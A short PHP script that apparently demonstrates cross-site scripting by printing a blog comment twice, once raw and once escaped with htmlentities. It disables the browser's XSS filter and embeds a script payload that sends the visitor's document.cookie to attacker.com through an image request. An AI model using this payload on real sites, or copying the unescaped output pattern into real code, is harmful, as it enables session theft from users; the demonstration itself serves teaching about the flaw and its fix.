<?php declare(strict_types=1);

header('X-XSS-Protection:0'); // to bypass evergreen browsers' XSS Audit protection

$comment = <<<COMMENT
Great blogpost! <script>document.write('<img src="https://attacker.com/collect.gif?cookie=' + encodeURIComponent(document.cookie)+'" />');</script>
COMMENT;

echo sprintf('<div>%s</div>', $comment);
echo sprintf('<div>%s</div>', htmlentities($comment));
